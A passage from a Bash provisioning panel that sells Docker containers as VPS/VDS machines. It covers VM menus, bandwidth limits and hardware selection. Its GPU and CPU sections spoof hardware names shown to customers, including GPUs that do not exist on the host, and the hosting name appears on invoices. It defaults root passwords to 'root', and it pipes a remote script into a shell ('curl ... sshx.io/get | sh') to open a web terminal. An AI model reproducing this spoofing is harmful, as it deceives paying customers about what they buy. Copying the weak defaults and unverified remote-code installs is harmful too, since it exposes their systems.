                        tc qdisc del dev \$IFACE root 2>/dev/null
                        tc qdisc add dev \$IFACE root handle 1: htb default 10
                        tc class add dev \$IFACE parent 1: classid 1:10 htb rate ${SAVED_SPEED}mbit ceil ${SAVED_SPEED}mbit burst 15k cburst 15k
                        tc qdisc add dev \$IFACE parent 1:10 handle 10: sfq perturb 10
                        echo '${SAVED_SPEED}' > /root/.speed_limit_value
                    " 2>/dev/null
                fi
                echo -e " ${GREEN}✔ Rebooted.${NC}"
                sleep 1
                ;;
            3)
                docker stop $vm_name
                echo -e " ${RED}✔ Stopped.${NC}"
                sleep 1
                ;;
            4)
                docker start $vm_name
                # Re-apply speed limit if configured
                SPEED_FILE="/root/.tasin/vms/${vm_name#tasin-vm-}/speed.info"
                if [ -f "$SPEED_FILE" ]; then
                    SAVED_SPEED=$(cat "$SPEED_FILE")
                    docker exec "$vm_name" bash -c "
                        if ! command -v tc >/dev/null 2>&1; then
                            apt-get update -qq && apt-get install -y -qq iproute2 >/dev/null 2>&1
                        fi
                        sleep 2
                        IFACE=\$(ip route 2>/dev/null | awk '/default/ {print \$5}' | head -1)
                        [ -z \"\$IFACE\" ] && IFACE=eth0
                        tc qdisc del dev \$IFACE root 2>/dev/null
                        tc qdisc add dev \$IFACE root handle 1: htb default 10
                        tc class add dev \$IFACE parent 1: classid 1:10 htb rate ${SAVED_SPEED}mbit ceil ${SAVED_SPEED}mbit burst 15k cburst 15k
                        tc qdisc add dev \$IFACE parent 1:10 handle 10: sfq perturb 10
                        echo '${SAVED_SPEED}' > /root/.speed_limit_value
                    " 2>/dev/null
                fi
                echo -e " ${GREEN}✔ Started.${NC}"
                sleep 1
                ;;
            5)
                echo -e " ${RED}⚠ WARNING: This will DELETE all data in $vm_name!${NC}"
                echo -n " Are you sure? (y/n): "
                read -r confirm
                if [ "$confirm" == "y" ]; then
                    OLD_TYPE=$(cat "/root/.tasin/vms/${vm_name#tasin-vm-}/vm_type.info" 2>/dev/null)
                    if [ -z "$OLD_TYPE" ]; then OLD_TYPE="vps"; fi

                    docker network rm "net_${vm_name}" >/dev/null 2>&1
                    docker rm -f $vm_name >/dev/null 2>&1
                    rm -rf "/root/.tasin/data/${vm_name#tasin-vm-}"
                    rm -f "/root/.tasin/vms/${vm_name#tasin-vm-}/cpu.info"
                    rm -f "/root/.tasin/vms/${vm_name#tasin-vm-}/dmi_product.info"
                    rm -f "/root/.tasin/vms/${vm_name#tasin-vm-}/dmi_vendor.info"
                    remove_local_state "$vm_name"
                    log_msg "VM Wiped: $vm_name"
                    echo -e " ${GREEN}✔ VM Wiped.${NC} Sending to creation menu..."
                    sleep 2
                    create_vm "$OLD_TYPE" "${vm_name#tasin-vm-}"
                    return
                fi
                ;;
            6)
                echo -n " Confirm Deletion (y/n): "
                read -r confirm
                if [ "$confirm" == "y" ]; then
                    local delete_hostname="${vm_name#tasin-vm-}"

                    docker network rm "net_${vm_name}" >/dev/null 2>&1
                    docker rm -f $vm_name >/dev/null 2>&1
                    rm -rf "/root/.tasin/data/${delete_hostname}"
                    rm -f "/root/.tasin/vms/${delete_hostname}/cpu.info"
                    rm -f "/root/.tasin/vms/${delete_hostname}/dmi_product.info"
                    rm -f "/root/.tasin/vms/${delete_hostname}/dmi_vendor.info"
                    rm -f "/root/.tasin/vms/${delete_hostname}/vm_type.info"
                    rm -f "/root/.tasin/vms/${delete_hostname}/gpu_name.info"
                    rm -f "/root/.tasin/vms/${delete_hostname}/gpu_vram.info"
                    rm -f "/root/.tasin/vms/${delete_hostname}/speed.info"
                    remove_local_state "$vm_name"
                    remove_vm_from_remote "$delete_hostname"

                    log_msg "VM Deleted: $vm_name"
                    echo -e " ${GREEN}✔ Deleted.${NC}"
                    sleep 1
                    return
                fi
                ;;
            7) show_vm_info "$vm_name" ;;
            8) edit_vm_config "$vm_name" ;;
            9) live_vm_performance "$vm_name" ;;
            10)
                if [ "$(docker inspect -f '{{.State.Running}}' $vm_name 2>/dev/null)" != "true" ]; then
                    echo -e " ${RED}✘ VM is not running. Start it first.${NC}"
                    sleep 2
                else
                    echo -e " ${CYAN}Installing SSHX and generating link...${NC}"
                    SSHX_OUT=$(docker exec "$vm_name" bash -c 'curl -sSf https://sshx.io/get 2>/dev/null | sh 2>/dev/null && sshx 2>/dev/null' 2>/dev/null)
                    if [ -n "$SSHX_OUT" ] && echo "$SSHX_OUT" | grep -q "https\|sshx\|."; then
                        SSHX_LINK=$(echo "$SSHX_OUT" | grep -oE 'https?://[^[:space:]]+' | head -1)
                        if [ -z "$SSHX_LINK" ]; then
                            SSHX_LINK=$(echo "$SSHX_OUT" | tail -1)
                        fi
                        echo ""
                        echo -e " ${GREEN}✔ SSHX Web SSH Link:${NC}"
                        echo -e " ${WHITE}${BOLD}  ${SSHX_LINK}${NC}"
                        echo ""
                        # Try to copy to clipboard via SSH
                        echo "$SSHX_LINK" > "/root/.tasin/vms/${vm_name#tasin-vm-}/sshx.info"
                    else
                        echo -e " ${YELLOW}SSHX output:${NC}"
                        echo "$SSHX_OUT"
                        echo ""
                        echo -e " ${DIM}If no link above, SSHX may need manual setup inside the VM.${NC}"
                        echo -e " ${DIM}Run: curl -sSf https://sshx.io/get | sh && sshx${NC}"
                    fi
                    echo ""
                    echo -n " Press Enter to continue... "
                    read -r
                fi
                ;;
            0) return ;;
            *) ;;
        esac
    done
}

# Accepts: $1 = VM_TYPE (vps/vds), $2 = REINSTALL_NAME (optional)
parse_uptime_to_seconds() {
    local input="$1"
    local total=0
    # Extract years
    local years=$(echo "$input" | grep -oP '\d+(?=y)' | head -1)
    [ -n "$years" ] && total=$((total + years * 365 * 86400))
    # Extract days
    local days=$(echo "$input" | grep -oP '\d+(?=d)' | head -1)
    [ -n "$days" ] && total=$((total + days * 86400))
    # Extract hours
    local hours=$(echo "$input" | grep -oP '\d+(?=h)' | head -1)
    [ -n "$hours" ] && total=$((total + hours * 3600))
    # Extract minutes
    local mins=$(echo "$input" | grep -oP '\d+(?=m)' | head -1)
    [ -n "$mins" ] && total=$((total + mins * 60))
    # If plain number, treat as days
    if [ "$total" -eq 0 ] && [[ "$input" =~ ^[0-9]+$ ]]; then
        total=$((input * 86400))
    fi
    echo "$total"
}

# Convert seconds → human readable (e.g. "1 minute", "2 hours 5 minutes", "3 days 1 hour")
parse_seconds_to_human() {
    local sec="$1"
    [ -z "$sec" ] && sec=0
    local d=$(( sec / 86400 ))
    local rem=$(( sec % 86400 ))
    local h=$(( rem / 3600 ))
    local m=$(( (rem % 3600) / 60 ))
    local out=""
    if [ "$d" -gt 0 ]; then
        [ "$d" -eq 1 ] && out="${d} day" || out="${d} days"
    fi
    if [ "$h" -gt 0 ]; then
        [ -n "$out" ] && out="${out} "
        [ "$h" -eq 1 ] && out="${out}${h} hour" || out="${out}${h} hours"
    fi
    if [ "$m" -gt 0 ] || [ -z "$out" ]; then
        [ -n "$out" ] && out="${out} "
        [ "$m" -eq 1 ] && out="${out}${m} minute" || out="${out}${m} minutes"
    fi
    echo "$out"
}

create_vm() {
    local VM_TYPE=${1:-vps}
    local REINSTALL_NAME=${2:-}

    # ─── HOSTING NAME (shown on completion screen + invoice) ───
    # Default to "MinePanel" if user just presses Enter
    HOSTING_NAME=""
    clear
    echo -e "${GOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GOLD}║${NC}  ${BRIGHT_ORANGE}◆${NC} ${WHITE}TASIN VM PROVISIONING${NC}  ${PREMIUM}PREMIUM++${NC}            ${GOLD}║${NC}"
    echo -e "${GOLD}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e ""
    echo -e " ${DIM}This name appears on the final VM delivery screen and invoice.${NC}"
    echo -ne " ${YELLOW}Enter Your Hosting Name${NC} ${DIM}[default: MinePanel]${NC}: "
    read -r HOSTING_NAME
    HOSTING_NAME="${HOSTING_NAME//$'\r'/}"
    HOSTING_NAME=$(echo "$HOSTING_NAME" | xargs)
    [ -z "$HOSTING_NAME" ] && HOSTING_NAME="MinePanel"
    echo -e " ${GREEN}✔ Hosting Name: ${CYAN}${HOSTING_NAME}${NC}"
    sleep 1

    if [ -n "$REINSTALL_NAME" ]; then
        VM_ID_NAME=$REINSTALL_NAME
        clear
        echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
        echo -e "         ${WHITE}REINSTALLING: ${VM_ID_NAME} (${VM_TYPE^^})${NC}"
        echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
        echo -n " Set New Root Password: "
        read -r VM_PASS
        if [ -z "$VM_PASS" ]; then VM_PASS="root"; fi
    else
        clear
        echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
        echo -e "         ${WHITE}CREATE NEW INSTANCE (${VM_TYPE^^})${NC}"
        echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
        echo -n " 1. Enter Hostname (e.g. web1): "
        read -r INPUT_NAME
        VM_ID_NAME=$(echo "$INPUT_NAME" | tr -cd 'A-Za-z0-9_-')

        echo -n " 2. Set Root Password: "
        read -r VM_PASS
        if [ -z "$VM_PASS" ]; then VM_PASS="root"; fi
    fi

    VM_NAME="tasin-vm-$VM_ID_NAME"
    DATA_DIR="$TASIN_DATA/$VM_ID_NAME"
    local VM_INFO="$TASIN_VMS/$VM_ID_NAME"
    mkdir -p "$VM_INFO"
    CPU_FILE="$VM_INFO/cpu.info"
    DMI_PRODUCT_FILE="$VM_INFO/dmi_product.info"
    DMI_VENDOR_FILE="$VM_INFO/dmi_vendor.info"
    TYPE_FILE="$VM_INFO/vm_type.info"

    echo "$VM_TYPE" > "$TYPE_FILE"

    # ==========================================
    # OS SELECTION
    # ==========================================
    clear
    echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}SELECT LINUX DISTRIBUTION${NC}"
    echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
    echo -e " ${DIM}All VMs include: Systemctl, Docker, Python3, Node.js, Neofetch${NC}"
    echo -e ""
    echo -e " ${YELLOW}Ubuntu Server Editions:${NC}"
    echo -e "   1) Ubuntu 22.04 LTS"
    echo -e "   2) Ubuntu 20.04 LTS"
    echo -e "   3) Ubuntu 18.04 LTS"
    echo -e ""
    echo -e " ${RED}Debian Server Editions:${NC}"
    echo -e "   4) Debian 12 (Newest)"
    echo -e "   5) Debian 11"
    echo -e "   6) Debian 10"
    echo -e ""
    echo -e " ${BLUE}Other:${NC}"
    echo -e "   7) Kali Linux"
    echo -e "   8) Alpine Linux ${DIM}(OpenRC, limited features)${NC}"
    echo -e "${BLUE}────────────────────────────────────────────────────${NC}"
    printf " Selection [1-8]: "
    read -r os_sel

    VM_SHELL="/bin/bash"
    IS_FULL=true
    case "$os_sel" in
        1) IMG="jrei/systemd-ubuntu:22.04" ;;
        2) IMG="jrei/systemd-ubuntu:20.04" ;;
        3) IMG="jrei/systemd-ubuntu:18.04" ;;
        4) IMG="jrei/systemd-debian:12" ;;
        5) IMG="jrei/systemd-debian:11" ;;
        6) IMG="debian:10"; IS_FULL=false ;;
        7) IMG="kalilinux/kali-rolling:latest"; IS_FULL=false ;;
        8) IMG="alpine:latest"; VM_SHELL="/bin/sh"; IS_FULL=false ;;
        *) IMG="jrei/systemd-ubuntu:22.04" ;;
    esac

    # ==========================================
    # CUSTOM HOST MODEL NAME
    # ==========================================
    clear
    echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}SET SYSTEM MODEL NAME${NC}"
    echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
    echo -e " This will appear as the 'Host' in neofetch and system info."
    echo -e " Leave blank to use the default host detection."
    echo -n " Enter Model Name (e.g. MinePanel Host Ltd.): "
    read -r MODEL_NAME

    if [ -n "$MODEL_NAME" ]; then
        echo "$MODEL_NAME" > "$DMI_PRODUCT_FILE"
        echo "$MODEL_NAME" > "$DMI_VENDOR_FILE"
    fi

    # ==========================================

    # ==========================================
    # RESOURCE ALLOCATION (RAM & CPU)
    # ==========================================
    clear
    HAS_KVM=$(check_real_kvm)
    if [ "$HAS_KVM" == "true" ]; then
        KVM_MSG="${GREEN}Detected (Real Hardware KVM)${NC}"
    else
        KVM_MSG="${RED}Not Detected (Software Mode)${NC}"
    fi

    echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}RESOURCE ALLOCATION TYPE${NC}"
    echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
    echo -e " Hypervisor Status: $KVM_MSG"
    if [ "$VM_TYPE" == "vds" ]; then
        echo -e " Mode: ${PURPLE}VDS (Full KVM /dev/kvm mapped into container)${NC}"
    else
        echo -e " Mode: ${GREEN}VPS (Software Virtualization, No KVM access)${NC}"
    fi
    echo -e ""
    echo -e " 1) ${GREEN}Dedicated Resources${NC} (CPU + RAM Hard Limit)"
    echo -e " 2) ${YELLOW}Shared / Limit${NC} (Standard VPS, CPU + RAM)"
    echo -e " 3) ${PURPLE}System Default${NC} (Unlimited - Shows Full Host Resources)"
    echo -e " 4) ${LIME}Fresh VPS Start${NC} (Container shows its OWN usage, not host's)"
    echo -e "    ${DIM}→ neofetch/free -h display the container's real RAM/Disk/CPU${NC}"
    echo -e "${BLUE}────────────────────────────────────────────────────${NC}"
    printf " Selection [1-4]: "
    read -r res_type
    res_type="${res_type//$'\r'/}"

    RAM=""
    CORES=""
    MODE="shared"
    FRESH_MODE=false

    if [ "$res_type" == "3" ]; then
        MODE="unlimited"
        echo -e " ${PURPLE}>> System Default Selected: Using full Host Power.${NC}"
        sleep 1
    elif [ "$res_type" == "4" ]; then
        # Fresh VPS Start — NO RAM/CPU limits set. The container uses whatever
        # it needs from the host, and the stats wrappers show the CONTAINER's
        # actual usage (not the host's total). This is like a "real" VPS where
        # you see your own usage without a hard limit.
        MODE="fresh"
        FRESH_MODE=true
        RAM=""
        CORES=""
        echo -e " ${LIME}>> Fresh VPS Start Selected.${NC}"
        echo -e " ${DIM}   No hard RAM/CPU limits — the container uses host resources${NC}"
        echo -e " ${DIM}   dynamically, and neofetch/free show the container's OWN usage.${NC}"
        sleep 2
    else
        echo -n " Enter RAM (e.g. 1g, 4g, 8g): "
        read -r RAM
        if [ -z "$RAM" ]; then RAM="1g"; fi
        RAM=$(echo "$RAM" | tr -d '[:space:]')

        echo -n " Enter CPU Cores (e.g. 1, 2, 4): "
        read -r CORES
        if [ -z "$CORES" ]; then CORES="1"; fi
        CORES=$(echo "$CORES" | tr -d '[:space:]')

        if [ "$res_type" == "1" ]; then
            MODE="dedicated"
        else
            MODE="shared"
        fi
    fi

    # ==========================================
    # NETWORK SPEED LIMIT
    # ==========================================
    clear
    NET_SPEED=""
    echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}SET INTERNET SPEED${NC}"
    echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
    echo -e " Enter speed in Mbps (e.g. 1000 = 1Gbps, 500 = 500Mbps)"
    echo -e " Leave blank or type ${YELLOW}default${NC} for unlimited speed."
    echo -e ""
    echo -n " Set Internet Speed (Mbps) [default]: "
    read -r speed_input
    if [ -n "$speed_input" ] && [[ "$speed_input" =~ ^[0-9]+$ ]]; then
        NET_SPEED="$speed_input"
        if [ "$NET_SPEED" -ge 1000 ]; then
            echo -e " ${GREEN}✔ Speed set to $((NET_SPEED/1000))Gbps${NC}"
        else
            echo -e " ${GREEN}✔ Speed set to ${NET_SPEED}Mbps${NC}"
        fi
    else
        echo -e " ${YELLOW}✔ Using default (unlimited).${NC}"
    fi
    sleep 1

    # ==========================================
    # GPU SETUP
    # ==========================================
    clear
    GPU_DEVICE=""
    GPU_SPOOF_NAME=""
    GPU_SPOOF_VRAM=""
    echo -e "${CYAN}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}GPU CONFIGURATION${NC}"
    echo -e "${CYAN}└──────────────────────────────────────────────────┘${NC}"
    printf " Do you want GPU? (y/n): "
    read -r gpu_yes
    gpu_yes="${gpu_yes//$'\r'/}"
    gpu_yes="${gpu_yes,,}"

    if [[ "$gpu_yes" == "y" ]]; then
        echo -e ""
        echo -e " ${GREEN}Select GPU Preset:${NC}"
        echo -e "   1) ${CYAN}NVIDIA RTX 4090${NC}        + 24GB VRAM"
        echo -e "   2) ${CYAN}NVIDIA RTX 4080 SUPER${NC}  + 16GB VRAM"
        echo -e "   3) ${CYAN}NVIDIA RTX 4070 Ti SUPER${NC} + 16GB VRAM"
        echo -e "   4) ${CYAN}NVIDIA RTX 3090${NC}        + 24GB VRAM"
        echo -e "   5) ${CYAN}NVIDIA A100${NC}            + 80GB VRAM"
        echo -e "   6) ${CYAN}NVIDIA RTX 6000 Ada${NC}    + 48GB VRAM"
        echo -e "   7) ${CYAN}NVIDIA L40S${NC}            + 48GB VRAM"
        echo -e "   8) ${YELLOW}Custom GPU (Enter Name + VRAM)${NC}"
        echo -e ""
        echo -n " Selection [1-8]: "
        read -r gpu_sel

        case "$gpu_sel" in
            1) GPU_SPOOF_NAME="NVIDIA RTX 4090"; GPU_SPOOF_VRAM="24576" ;;
            2) GPU_SPOOF_NAME="NVIDIA RTX 4080 SUPER"; GPU_SPOOF_VRAM="16384" ;;
            3) GPU_SPOOF_NAME="NVIDIA RTX 4070 Ti SUPER"; GPU_SPOOF_VRAM="16384" ;;
            4) GPU_SPOOF_NAME="NVIDIA RTX 3090"; GPU_SPOOF_VRAM="24576" ;;
            5) GPU_SPOOF_NAME="NVIDIA A100"; GPU_SPOOF_VRAM="81920" ;;
            6) GPU_SPOOF_NAME="NVIDIA RTX 6000 Ada Generation"; GPU_SPOOF_VRAM="49152" ;;
            7) GPU_SPOOF_NAME="NVIDIA L40S"; GPU_SPOOF_VRAM="49152" ;;
            8)
                echo -n " Enter GPU Name (e.g. NVIDIA RTX 4090): "
                read -r GPU_SPOOF_NAME
                if [ -z "$GPU_SPOOF_NAME" ]; then
                    GPU_SPOOF_NAME="NVIDIA RTX 4090"
                fi
                echo -n " Enter VRAM in MB (e.g. 24576 for 24GB): "
                read -r vram_input
                if [ -n "$vram_input" ] && [[ "$vram_input" =~ ^[0-9]+$ ]]; then
                    GPU_SPOOF_VRAM="$vram_input"
                else
                    GPU_SPOOF_VRAM="24576"
                fi
                ;;
            *) GPU_SPOOF_NAME="NVIDIA RTX 4090"; GPU_SPOOF_VRAM="24576" ;;
        esac

        local gpu_vram_gb=$((GPU_SPOOF_VRAM / 1024))
        if [ $gpu_vram_gb -eq 0 ]; then gpu_vram_gb=1; fi
        echo -e " ${GREEN}✔ GPU: ${GPU_SPOOF_NAME} (${GPU_SPOOF_VRAM}MB / ${gpu_vram_gb}GB VRAM)${NC}"

        # Save GPU info for persistence
        echo "$GPU_SPOOF_NAME" > "/root/.tasin/vms/${VM_ID_NAME}/gpu_name.info"
        echo "$GPU_SPOOF_VRAM" > "/root/.tasin/vms/${VM_ID_NAME}/gpu_vram.info"

        # Physical GPU passthrough (only if host has real GPUs)
        if command -v nvidia-smi >/dev/null 2>&1; then
            echo -e ""
            echo -e " Detected physical GPUs on host:"
            nvidia-smi --query-gpu=index,name,memory.total --format=csv,noheader 2>/dev/null | while IFS=',' read -r idx name mem; do
                echo -e "   ${GREEN}GPU $idx${NC}: ${WHITE}${name// /} (${mem// /})${NC}"
            done
            echo -e ""
            printf " Pass a real GPU device? (y/n): "
            read -r real_gpu_yes
            real_gpu_yes="${real_gpu_yes//$'\r'/}"
            real_gpu_yes="${real_gpu_yes,,}"

            if [[ "$real_gpu_yes" == "y" ]]; then
                echo -n " Enter GPU index (e.g. 0) or 'all': "
                read -r gpu_idx
                if [ -n "$gpu_idx" ]; then
                    GPU_DEVICE="$gpu_idx"
                    echo -e " ${GREEN}✔ Real GPU $gpu_idx will be passed + spoofed as ${GPU_SPOOF_NAME}.${NC}"
                fi
            else
                echo -e " ${GREEN}✔ GPU will be spoofed only (no real device).${NC}"
            fi
        else
            echo -e " ${YELLOW}⚠ No physical GPU on host. Spoofing GPU name only.${NC}"
        fi
        sleep 2
    fi

    # ==========================================
    # CPU SPOOFING
    # ==========================================
    clear
    echo -e "${PURPLE}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}SELECT CPU VENDOR FAMILY${NC}"
    echo -e "${PURPLE}└──────────────────────────────────────────────────┘${NC}"
    echo -e " 1) ${RED}AuthenticAMD${NC}"
    echo -e " 2) ${BLUE}GenuineIntel${NC}"
    echo -e " 3) ${GREEN}Custom / Manual${NC}"
    echo -e " 4) Default (Use Host CPU)"
    echo -e "${BLUE}────────────────────────────────────────────────────${NC}"
    printf " Select Vendor [1-4]: "
    read -r vendor_sel
    vendor_sel="${vendor_sel//$'\r'/}"

    V_ID="GenuineIntel"
    C_NAME="Intel Xeon"
    C_BASE_MHZ="2500.000"
    C_BOOST_MHZ="3500.000"
    C_MHZ="2500.000"
    USE_SPOOF=true

    case "$vendor_sel" in
        1)
            V_ID="AuthenticAMD"
            clear
            echo -e " ${RED}AMD Processor Models${NC}"
            echo -e ""
            echo -e " ${YELLOW}Ryzen Desktop:${NC}"
            echo -e "   1)  ${CYAN}AMD Ryzen 9 7950X3D${NC}       (16-Core, 4.2/5.7 GHz)"
            echo -e "   2)  ${CYAN}AMD Ryzen 9 7950X${NC}         (16-Core, 4.5/5.7 GHz)"
            echo -e "   3)  ${CYAN}AMD Ryzen 9 5950X${NC}         (16-Core, 3.4/4.9 GHz)"
            echo -e "   4)  ${CYAN}AMD Ryzen 9 5900X${NC}         (12-Core, 3.7/4.8 GHz)"
            echo -e "   5)  ${CYAN}AMD Ryzen 7 7800X3D${NC}       (8-Core, 4.2/5.0 GHz)"
            echo -e "   6)  ${CYAN}AMD Ryzen 7 5800X${NC}         (8-Core, 3.8/4.7 GHz)"
            echo -e ""
            echo -e " ${YELLOW}EPYC Server:${NC}"
            echo -e "   7)  ${CYAN}AMD EPYC 9654${NC}             (96-Core, 2.2/3.7 GHz)"
            echo -e "   8)  ${CYAN}AMD EPYC 9754${NC}             (96-Core, 2.7/3.8 GHz)"
            echo -e "   9)  ${CYAN}AMD EPYC 7763${NC}             (64-Core, 2.25/3.45 GHz)"
            echo -e ""
            echo -e " ${YELLOW}Threadripper:${NC}"
            echo -e "  10)  ${CYAN}AMD Threadripper PRO 5995WX${NC}  (64-Core, 2.7/4.5 GHz)"
            echo -e "  11)  ${CYAN}AMD Threadripper PRO 5975WX${NC}  (32-Core, 3.2/4.6 GHz)"
            echo -e ""
            printf " Select Model [1-11]: "
            read -r amd_model
            amd_model="${amd_model//$'\r'/}"
            case "$amd_model" in
                1)  C_NAME="AMD Ryzen 9 7950X3D 16-Core Processor"
                    C_BASE_MHZ="4200.000"; C_BOOST_MHZ="5700.000" ;;
                2)  C_NAME="AMD Ryzen 9 7950X 16-Core Processor"
                    C_BASE_MHZ="4500.000"; C_BOOST_MHZ="5700.000" ;;
                3)  C_NAME="AMD Ryzen 9 5950X 16-Core Processor"
                    C_BASE_MHZ="3400.000"; C_BOOST_MHZ="4900.000" ;;
                4)  C_NAME="AMD Ryzen 9 5900X 12-Core Processor"
                    C_BASE_MHZ="3700.000"; C_BOOST_MHZ="4800.000" ;;
                5)  C_NAME="AMD Ryzen 7 7800X3D 8-Core Processor"
                    C_BASE_MHZ="4200.000"; C_BOOST_MHZ="5050.000" ;;
                6)  C_NAME="AMD Ryzen 7 5800X 8-Core Processor"
                    C_BASE_MHZ="3800.000"; C_BOOST_MHZ="4700.000" ;;
                7)  C_NAME="AMD EPYC 9654 96-Core Processor"
                    C_BASE_MHZ="2200.000"; C_BOOST_MHZ="3700.000" ;;
                8)  C_NAME="AMD EPYC 9754 96-Core Processor"
                    C_BASE_MHZ="2700.000"; C_BOOST_MHZ="3800.000" ;;
                9)  C_NAME="AMD EPYC 7763 64-Core Processor"
                    C_BASE_MHZ="2250.000"; C_BOOST_MHZ="3450.000" ;;
                10) C_NAME="AMD Ryzen Threadripper PRO 5995WX 64-Core Processor"
                    C_BASE_MHZ="2700.000"; C_BOOST_MHZ="4500.000" ;;
                11) C_NAME="AMD Ryzen Threadripper PRO 5975WX 32-Core Processor"
                    C_BASE_MHZ="3200.000"; C_BOOST_MHZ="4600.000" ;;
                *)  C_NAME="AMD EPYC Processor"
                    C_BASE_MHZ="3000.000"; C_BOOST_MHZ="3500.000" ;;
            esac
            ;;
        2)
            V_ID="GenuineIntel"
            clear
            echo -e " ${BLUE}Intel Processor Models${NC}"
            echo -e ""
            echo -e " ${YELLOW}Core i9 (Enthusiast):${NC}"
            echo -e "   1)  ${CYAN}Intel Core i9-14900KS${NC}      (24-Core, 3.2/6.2 GHz)"
            echo -e "   2)  ${CYAN}Intel Core i9-14900K${NC}       (24-Core, 3.2/6.0 GHz)"
            echo -e "   3)  ${CYAN}Intel Core i9-13900K${NC}       (24-Core, 3.0/5.8 GHz)"
            echo -e "   4)  ${CYAN}Intel Core i9-12900K${NC}       (16-Core, 2.4/5.2 GHz)"
            echo -e ""
            echo -e " ${YELLOW}Core i7 (Performance):${NC}"
            echo -e "   5)  ${CYAN}Intel Core i7-14700K${NC}       (20-Core, 3.4/5.6 GHz)"
            echo -e "   6)  ${CYAN}Intel Core i7-13700K${NC}       (16-Core, 2.4/5.4 GHz)"
            echo -e "   7)  ${CYAN}Intel Core i7-12700K${NC}       (12-Core, 2.5/5.0 GHz)"
            echo -e ""
            echo -e " ${YELLOW}Xeon (Server):${NC}"
            echo -e "   8)  ${CYAN}Intel Xeon Platinum 8490H${NC}  (60-Core, 1.8/3.5 GHz)"
            echo -e "   9)  ${CYAN}Intel Xeon Platinum 8380${NC}   (40-Core, 2.3/3.4 GHz)"
            echo -e "  10)  ${CYAN}Intel Xeon Gold 6130${NC}       (20-Core, 2.0/3.7 GHz)"
            echo -e "  11)  ${CYAN}Intel Xeon W-2295${NC}          (18-Core, 2.3/4.5 GHz)"
            echo -e ""
            printf " Select Model [1-11]: "
            read -r intel_model
            intel_model="${intel_model//$'\r'/}"
            case "$intel_model" in
                1)  C_NAME="Intel(R) Core(TM) i9-14900KS"
                    C_BASE_MHZ="3200.000"; C_BOOST_MHZ="6200.000" ;;
                2)  C_NAME="Intel(R) Core(TM) i9-14900K"
                    C_BASE_MHZ="3200.000"; C_BOOST_MHZ="6000.000" ;;
                3)  C_NAME="Intel(R) Core(TM) i9-13900K"
                    C_BASE_MHZ="3000.000"; C_BOOST_MHZ="5800.000" ;;
                4)  C_NAME="Intel(R) Core(TM) i9-12900K"
                    C_BASE_MHZ="2400.000"; C_BOOST_MHZ="5200.000" ;;
                5)  C_NAME="Intel(R) Core(TM) i7-14700K"
                    C_BASE_MHZ="3400.000"; C_BOOST_MHZ="5600.000" ;;
                6)  C_NAME="Intel(R) Core(TM) i7-13700K"
                    C_BASE_MHZ="2400.000"; C_BOOST_MHZ="5400.000" ;;
                7)  C_NAME="Intel(R) Core(TM) i7-12700K"
                    C_BASE_MHZ="2500.000"; C_BOOST_MHZ="5000.000" ;;
                8)  C_NAME="Intel(R) Xeon(R) Platinum 8490H"
                    C_BASE_MHZ="1800.000"; C_BOOST_MHZ="3500.000" ;;
                9)  C_NAME="Intel(R) Xeon(R) Platinum 8380"
                    C_BASE_MHZ="2300.000"; C_BOOST_MHZ="3400.000" ;;
                10) C_NAME="Intel(R) Xeon(R) Gold 6130 CPU"
                    C_BASE_MHZ="2000.000"; C_BOOST_MHZ="3700.000" ;;
                11) C_NAME="Intel(R) Xeon(R) W-2295"
                    C_BASE_MHZ="2300.000"; C_BOOST_MHZ="4500.000" ;;
                *)  C_NAME="Intel(R) Xeon(R) CPU"
                    C_BASE_MHZ="2500.000"; C_BOOST_MHZ="3500.000" ;;
            esac
            ;;
        3)
            clear
            echo -e " ${GREEN}Custom CPU Configuration${NC}"
            printf " 1. Enter Vendor ID (e.g. GenuineIntel / AuthenticAMD): "
            read -r V_ID
            printf " 2. Enter Model Name: "
            read -r C_NAME
            printf " 3. Enter Base Speed (MHz, e.g. 3700.000): "
            read -r C_BASE_MHZ
            printf " 4. Enter Boost Speed (MHz, e.g. 4900.000): "
            read -r C_BOOST_MHZ
            # Strip CRLF + whitespace (fixes custom CPU not working when input has trailing \r)
            V_ID="${V_ID//$'\r'/}"; V_ID=$(echo "$V_ID" | xargs)
            C_NAME="${C_NAME//$'\r'/}"; C_NAME=$(echo "$C_NAME" | xargs)
            C_BASE_MHZ="${C_BASE_MHZ//$'\r'/}"; C_BASE_MHZ=$(echo "$C_BASE_MHZ" | xargs)
            C_BOOST_MHZ="${C_BOOST_MHZ//$'\r'/}"; C_BOOST_MHZ=$(echo "$C_BOOST_MHZ" | xargs)
            if [ -z "$V_ID" ]; then V_ID="GenuineIntel"; fi
            if [ -z "$C_NAME" ]; then C_NAME="Custom CPU"; fi
            if [ -z "$C_BASE_MHZ" ]; then C_BASE_MHZ="2500.000"; fi
            if [ -z "$C_BOOST_MHZ" ]; then C_BOOST_MHZ="3500.000"; fi
            echo -e " ${GREEN}✔ Custom CPU: ${C_NAME} (${V_ID}) @ ${C_BASE_MHZ}/${C_BOOST_MHZ} MHz${NC}"
            sleep 1
            ;;
        4)
            USE_SPOOF=false
            ;;
        *)
            USE_SPOOF=false
            ;;
    esac

    # ==========================================
    # CLOCK SPEED BOOST SELECTION
    # ==========================================
    if [ "$USE_SPOOF" = true ]; then
        # Convert MHz to GHz for display
        C_BASE_GHZ=$(awk "BEGIN {printf \"%.1f\", ${C_BASE_MHZ}/1000}")
        C_BOOST_GHZ=$(awk "BEGIN {printf \"%.1f\", ${C_BOOST_MHZ}/1000}")

        echo -e ""
        echo -e " ${GOLD}${BOLD}CPU Selected: ${C_NAME}${NC}"
